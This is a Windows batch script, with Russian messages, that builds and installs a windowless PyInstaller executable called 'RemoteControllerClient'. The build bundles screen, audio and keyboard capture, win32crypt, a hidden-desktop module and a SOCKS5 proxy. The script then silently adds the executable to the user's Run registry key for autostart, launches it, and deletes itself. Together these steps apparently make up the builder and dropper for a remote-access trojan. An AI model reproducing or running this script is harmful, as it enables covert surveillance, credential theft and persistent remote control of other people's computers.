@echo off
setlocal

set "SCRIPT_DIR=%~dp0"
pushd "%SCRIPT_DIR%"

set "PY_CMD="
where py >nul 2>nul
if not errorlevel 1 (
    py -3.11 -c "import sys" >nul 2>nul
    if not errorlevel 1 (
        set "PY_CMD=py -3.11"
    ) else (
        py -3 -c "import sys" >nul 2>nul
        if not errorlevel 1 set "PY_CMD=py -3"
    )
)
if not defined PY_CMD (
    where python >nul 2>nul
    if errorlevel 1 (
        echo Python не найден. Установите Python 3.11+ и повторите запуск.
        popd
        exit /b 1
    )
    set "PY_CMD=python"
)
%PY_CMD% -c "import sys; raise SystemExit(0 if sys.version_info >= (3,11) else 1)" >nul 2>nul
if errorlevel 1 (
    echo Python 3.11+ обязателен для сборки.
    popd
    exit /b 1
)
for /f "delims=" %%P in ('%PY_CMD% -c "import sys;print(sys.executable)" 2^>nul') do set "PY_EXE=%%P"
if not defined PY_EXE (
    echo Python не найден. Установите Python 3.11+ и повторите запуск.
    popd
    exit /b 1
)
echo %PY_EXE% | find /i "WindowsApps" >nul
if not errorlevel 1 (
    echo Обнаружен Python-Launcher из Microsoft Store. Установите Python 3.11+ (python.org) и повторите запуск.
    popd
    exit /b 1
)
if not exist ".venv\\Scripts\\python.exe" (
    echo Создаем виртуальное окружение...
    %PY_CMD% -m venv .venv
    if errorlevel 1 (
        echo Не удалось создать виртуальное окружение.
        popd
        exit /b 1
    )
)

set "VENV_PY=%SCRIPT_DIR%.venv\\Scripts\\python.exe"

echo Обновляем pip/setuptools/wheel...
%VENV_PY% -m pip install --upgrade pip setuptools wheel

set "REQ_FILE=%SCRIPT_DIR%..\\requirements.txt"
if exist "%REQ_FILE%" (
    echo Устанавливаем общие зависимости проекта...
    %VENV_PY% -m pip install -r "%REQ_FILE%"
) else (
    echo Устанавливаем зависимости клиента...
    %VENV_PY% -m pip install -r requirements-client.txt
)
if errorlevel 1 (
    echo Установка зависимостей завершилась с ошибкой.
    popd
    exit /b 1
)

echo Устанавливаем PyInstaller...
%VENV_PY% -m pip install pyinstaller
if errorlevel 1 (
    echo Установка PyInstaller завершилась с ошибкой.
    popd
    exit /b 1
)

echo Собираем exe...
%VENV_PY% -m PyInstaller --onefile --name RemoteControllerClient --clean --noconsole ^
    --collect-all av ^
    --collect-all aiortc ^
    --collect-all sounddevice ^
    --collect-all mss ^
    --collect-all numpy ^
    --collect-all pynput ^
    --collect-submodules remote_client ^
    --hidden-import=win32crypt ^
    --hidden-import=cryptography ^
    --hidden-import=pynput ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=remote_client.session_factory ^
    --hidden-import=remote_client.apps.launcher ^
    --hidden-import=remote_client.windows.hidden_desktop ^
    --hidden-import=remote_client.proxy.socks5_server ^
    --add-data "remote_client\rc_activity.env;remote_client" ^
    client.py
if errorlevel 1 (
    echo Сборка завершилась с ошибкой.
    popd
    exit /b 1
)

set "EXE_PATH=%SCRIPT_DIR%dist\\RemoteControllerClient.exe"
if not exist "%EXE_PATH%" (
    echo Не найден файл %EXE_PATH%
    popd
    exit /b 1
)

if exist "%SCRIPT_DIR%start_silent.vbs" (
    copy /y "%SCRIPT_DIR%start_silent.vbs" "%SCRIPT_DIR%dist\start_silent.vbs" >nul
)


echo Добавляем в автозапуск текущего пользователя...
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteControllerClient" /t REG_SZ /d "\"%EXE_PATH%\"" /f >nul

echo Запускаем клиент...
start "" "%EXE_PATH%"

echo.
echo Готово! Файл: dist\\RemoteControllerClient.exe
echo.

popd
start "" /b cmd /c "ping 127.0.0.1 -n 2 > nul & del \"%~f0\""
endlocal


